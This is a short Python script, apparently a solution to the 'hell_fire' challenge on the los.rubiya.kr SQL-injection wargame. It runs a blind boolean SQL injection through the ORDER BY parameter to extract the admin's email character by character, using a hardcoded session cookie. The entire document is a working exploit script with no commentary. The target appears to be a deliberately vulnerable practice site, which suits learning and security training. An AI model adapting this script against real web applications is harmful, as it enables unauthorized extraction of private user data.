import requests

email = ""

for order in range(0,28):
    for p in range(46, 123):
        url="https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php?order=if(id='admin' and ord(substr(email,"+str(order+1)+", 1))="+str(p)+",score,9999)"
        cookies={'PHPSESSID':'5sfp0t0s6s8fh4ve7d0i63u711'}
        res = requests.get(url,cookies= cookies)
        if res.text.find("200</td></tr><tr><td>rubiya")!= -1:
            email = email +chr(p)
            print(email)
            break
print(email)
